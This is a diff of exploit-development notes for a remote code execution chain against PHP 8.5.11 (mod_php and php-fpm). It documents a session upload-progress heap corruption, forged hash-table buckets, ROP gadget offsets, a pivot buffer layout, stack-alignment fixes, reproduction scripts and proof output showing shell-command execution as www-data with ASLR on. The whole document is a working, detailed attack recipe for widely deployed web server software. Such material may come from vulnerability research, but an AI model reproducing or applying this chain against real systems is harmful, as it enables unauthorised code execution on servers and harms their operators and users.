@@ -1,11 +1,13 @@
 # B2 pivot + popen ROP variant
 
 Status: validated on mod_php 8.5.11 (10 prefork children, 9 pins, stock
-KeepAlive and php.ini-production): `uid=33(www-data)`. The same pivot exists in
-the php-fpm binary, but the in-band FPM teardown overwrites the pivot's first
-qword with the upload-progress insert; the path around it is the mod_php-style
-fake-reference/fake-HashTable B2, which still needs heap calibration. The FPM
-`zif_system` chain remains the working FPM RCE.
+KeepAlive and php.ini-production): `uid=33(www-data)`. **Also validated on
+php-fpm 8.5.11, no forged `execute_data`, ASLR on, stock `php.ini-production`,
+one worker, no gdb: 7/7 runs `uid=33(www-data)`** (`fpm/run_rop_pivot.sh`, see
+§"FPM data-only pivot"). The teardown destroy still can't carry the pivot (it
+fires on the progress-clobbered bucket 0); the working trigger is the
+upload-progress `zend_hash_update` itself, whose old-value destructor runs on
+the clean bucket 0 before the insert overwrites it.
 
 ## Why replace the execute_data frame
 
@@ -57,75 +59,133 @@ RCE OK
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## FPM attempt
+## FPM gadgets (php-fpm 8.5.11, md5 `de9f7bd2799504ff67240075fd4e6a03`)
 
-The php-fpm binary (base `0x555555400000` under `setarch -R`) has the same
-gadgets:
+ELF vaddr offsets (re-derived from the container binary; add the leaked PIE base):
 
-| gadget | offset | address |
-|---|---|---|
-| `jump_fcontext` pivot | `0x6bdd0e` | `0x555555abdd0e` |
-| `pop rdi;ret` | `0x20a7e8` | `0x55555560a7e8` |
-| `pop rsi;ret` | `0x209149` | `0x555555609149` |
-| `ret` | `0x20a7e9` | `0x55555560a7e9` |
-| `popen@plt` | `0x202e50` | `0x555555602e50` |
+| gadget | offset |
+|---|---|
+| `jump_fcontext` pivot | `0x6bdd0e` |
+| `pop rdi;ret` | `0x20a7e8` |
+| `pop rsi;ret` | `0x209149` |
+| `ret` (unused, see alignment) | `0x20a7e9` |
+| `popen@plt` | `0x202e50` |
+| `zif_system` | `0x60e3a0` |
 
-The in-band FPM B writes the fake table with the session decode. After
-`php_session_normalize_vars()`, the HT's `nNumUsed` (the var c tmp zval type at
-`HT+0x18`) is 0; the upload-progress `zend_hash_update` then writes **bucket 0**
-with the progress data zval. The pivot's first qword (MXCSR) becomes the stale
-progress array pointer `z`; `ldmxcsr` #GPs at `jump_fcontext+8`:
+There is no `system@plt` (PHP drives `popen`, not libc `system`), so the chain
+must pass a valid `"r"` mode pointer in rsi. Confirmed by search: the binary has
+exactly one `mov %rdi,%rsp` (the pivot), and no `mov/lea rsp,[rdi+imm]`, `xchg
+reg,rsp`, or `pop rsp` with a usable ret. The pivot is the only stack pivot.
+
+## The teardown-destroy obstacle (why the destroy can't carry the pivot)
+
+The in-band B installs the fake table (`arData = d+0xE80`, `pDestructor`) through
+the session decode. The arData-redirect element is a normal session var whose
+value is `IS_PTR` → `HT+0x10`. `php_session_normalize_vars()` runs at decode end
+and, for that `IS_PTR` bucket, does `ZVAL_UNDEF(zv)` on `zv = HT+0x10`; the type
+write lands at `HT+0x18` = **nNumUsed**, zeroing it. So the upload-progress
+`zend_hash_update` appends at bucket `[nNumUsed] = bucket 0`, overwriting the
+pivot buffer's first bucket (val `+0x00` and type `+0x08`, 16-byte zval). The
+teardown destroy then runs with `nNumUsed = 1` and fires `pDestructor(&bucket0.val)`
+on that clobbered bucket:
 
 ```
-HTDESTROY ... nu=1 nt=256 pd=0x555555abdd0e
-PIVOT rdi=0x7ffff63b9e00 q0=0x7ffff625c1f8 q40=0x55555560a7e8 ...
-SIGSEGV at jump_fcontext+8 (ldmxcsr)
+PIVOT rdi=d+0xE80  P00=0x7ffff625c230 (progress array)  P08=0x307 (IS_ARRAY)  P40=pop_rdi ...
+SIGSEGV at jump_fcontext+8 (ldmxcsr reads the array pointer as MXCSR -> #GP)
 ```
 
-The `zif_system` frame tolerated the same write because its opline field is
-unused; the pivot cannot. There is no `mov rsp,[rdi+imm]; ret`,
-`lea rsp,[rdi+imm]; ret`, or register pivot with a usable ret in the binary.
+The `zif_system` frame tolerates this because it reads `num_args`/`arg0` from
+buckets 1/2 (`+0x2C`/`+0x50`), which the 16-byte bucket-0 write never touches;
+the pivot's `ldmxcsr (%rsp)` at `jump_fcontext+8` reads `[arData+0]` and cannot.
+Preserving nNumUsed by reusing the arData key to redirect that element only
+moves the failure earlier: the reuse `zend_hash_update` fires the (already
+installed) `pDestructor` on the old `IS_PTR`→`HT+0x10` value → `ldmxcsr` of
+`HT+0x10` → same #GP.
 
-### Script-path attempt
+## FPM data-only pivot (working)
 
-A script `session_start(); $_SESSION['x'] = 0x0000037F00001F80;` would write a
-zval whose 64-bit value supplies a valid MXCSR and fldcw at bucket 0, after a
-normalize that leaves `nNumUsed = 0`. Tested: it does not reach the fake
-table. `PHP_RINIT_FUNCTION(basic)` zeroes `BG(unserialize)`
-(`ext/standard/basic_functions.c:393`) before any script runs, so the B's
-`session_start` allocates a fresh `d` instead of reusing the A's dangling one.
-The trace shows the B's real session array (`HT=0x7ffff625b230`, `pd=default`,
-`nu` 0..6) and no fake table writes. The upload-progress callback's
-`php_session_initialize()` runs during POST parsing, before
-`zend_activate_modules()`, which is why only that pre-RINIT path reuses the
-stale `d`.
+Don't use the teardown destroy. The upload-progress handler runs
+`zend_hash_update(session_array, "upload_progress_<name>", &data)`, which for an
+**existing** key calls `ht->pDestructor(&old->val)` *before* copying the new
+value in. Forge that key at bucket 0 so its old value is the pivot buffer: the
+update fires the pivot on a clean bucket 0, and the clobbering copy never runs
+(the pivot does not return). nNumUsed is irrelevant (the lookup uses the hash
+slots), so normalize zeroing it no longer matters.
 
-### Path
+Forged lookup for `upload_progress_x` (default prefix + the 1-byte progress
+field) → bucket 0:
 
-Use the mod_php-style fake reference/fake HashTable B2, triggered in the
-upload-progress callback's `php_session_track_init()` **before** the progress
-insert and before the RINIT reset: overwrite the A's stale
-`PS(http_session_vars)` reference with a fake reference pointing to a fake HT
-in the fill. `track_init`'s dtor then runs the pivot with an intact bucket 0;
-the progress insert (on the session array) never touches the fake HT. The
-mod_php B2's 500x384-byte spray is the starting point; the FPM reference and
-fake-HT placement need calibration. A single FPM worker gives the
-deterministic heap for that calibration.
+- `bucket0.h = DJBX33A("upload_progress_x") = 0xb3f1b35d4d1a35d5`, placed at
+  `d+0xE90` (gadget's r12 slot, don't-care).
+- `bucket0.key` → fill-resident `zend_string` (`len = 17`, bytes
+  `"upload_progress_x"`); only `len`/val are read by the key compare. Placed at
+  `d+0x200`, pointer in `d+0xE98` (r13 slot, don't-care).
+- `arHash[(h | nTableMask) as int32] = 0`. `nTableMask = -16` (nTableSize 16),
+  so the index is `-11` and the slot is `arData-0x2C = d+0xE54`.
 
-Until then, `fpm/run_rce_fpm.sh` with the `zif_system` fill/session is the
-working FPM chain.
+Pivot buffer at bucket 0 (`d+0xE80`, 16-aligned):
+
+| offset | value |
+|---|---|
+| `+0x00` | MXCSR `0x1F80` / fldcw `0x037F` (`0x0000037F00001F80`) |
+| `+0x08` | zval type `IS_NULL` |
+| `+0x10` | bucket0.h = key hash (r12) |
+| `+0x18` | bucket0.key ptr (r13) |
+| `+0x20..0x38` | r14/r15/rbx/rbp = 0 |
+| `+0x40` | `pop rdi;ret` (gadget's `jmp *r8` target) |
+| `+0x48` | command pointer (`d+0x100`) |
+| `+0x50` | `pop rsi;ret` |
+| `+0x58` | `"r"` pointer (`d+0x180`) |
+| `+0x60` | `popen@plt` |
+
+**Stack alignment:** `popen@plt` sits at `+0x60`, not `+0x68`. After the pivot's
+`lea 0x48(%rsp),%rsp`, the chain enters `popen` with `rsp % 16 == 8` only when
+the final slot is `+0x60`; a spare `ret` at `+0x68` shifts it to `0` and faults
+`_IO_proc_open` on a `movaps`.
+
+Command string at `d+0x100` (low byte `0x00`), `"r"` at `d+0x180`. The session
+is unchanged from the `zif_system` nogdb chain except `p8` installs the pivot
+gadget as `pDestructor` instead of `zif_system`:
+`p1..p5` E0 prelude, `p6` arData=`d+0xE80`, `p7` nTableSize=16, `p8`
+pDestructor=`base+0x6bdd0e`.
+
+### Reproduction
+
+```
+cd ~/php2shell
+bash fpm/run_rop_pivot.sh                 # MODE=nogdb (default), ASLR on
+MODE=gdb PROBE=probe-rop-native.gdb bash fpm/run_rop_pivot.sh   # traced
+```
+
+Isolated stack: FPM `p2s-fpm-pivot` (port 9101) + nginx `p2s-nginx-pivot`
+(9102) on network `p2s-pivot-net`, single worker. Leak/calibration are the
+Round 37 values (`PRE=24576`, `DRIFT=0x37000`, `d = heap+0x15cbd8+DRIFT`,
+`base = pie-0x7c9777`). Proof `/tmp/fpm_rop_proof`:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Reliability: 7/7 nogdb runs (ASLR on, stock `php.ini-production`). The worker
+SIGSEGVs after the command (the pivot never returns); FPM respawns it.
 
 ## Tools
 
-- `off_chain/stage3_rop.php`: B2 variant, select with
-  `STAGE3=stage3_rop.php` in `run_off_chain.sh` / `run_off_chain_pinned.sh`.
-- `fpm/mk_rop_fill.py`: builds the FPM ROP fill/session from `fillU.bin`
-  (analysis artifact; not yet a working FPM chain).
-- `fpm/probe-rop.gdb`: FPM trace with PIVOT/POPENPLT breakpoints.
+- `fpm/run_rop_pivot.sh`: the isolated FPM data-only pivot chain.
+- `fpm/mk_rop_pivot.py`: overlays the pivot buffer + forged progress-key lookup
+  onto the Round 37 `--nogdb` fill (`mk_native_fill.py --nogdb`).
+- `fpm/probe-rop-native.gdb`: PIVOT + `popen@plt` trace.
+- `fpm/probe-rop-diag.gdb`, `fpm/probe-rop-hash.gdb`: nNumUsed / bucket / key-hash
+  diagnostics used to pin the obstacle.
+- `off_chain/stage3_rop.php`: mod_php B2 variant (`STAGE3=stage3_rop.php`).
+- `fpm/mk_rop_fill.py`, `fpm/probe-rop.gdb`: superseded pre-Round-37 FPM ROP
+  artifacts (direct session-HT redirect; blocked by the bucket-0 clobber).
 
 ## Caveats
 
 Offsets are for these builds (php:8.5.11-apache libphp and the php-fpm binary);
-a real target needs the leaked bases and the same-child affinity. The mod_php
-variant still needs the A1/B1 leaks and the pinning (or a single worker). The
-FPM variant is not validated end to end.
+a real target needs the leaked bases and same-worker affinity (a single worker,
+or spray/pin as in `FPM_RCE.md` §8). The forged progress-key hash
+(`0xb3f1b35d4d1a35d5`) and slot index (`-11`) are specific to the key
+`upload_progress_x` and `nTableSize = 16`; a different progress field value or
+table size shifts both.
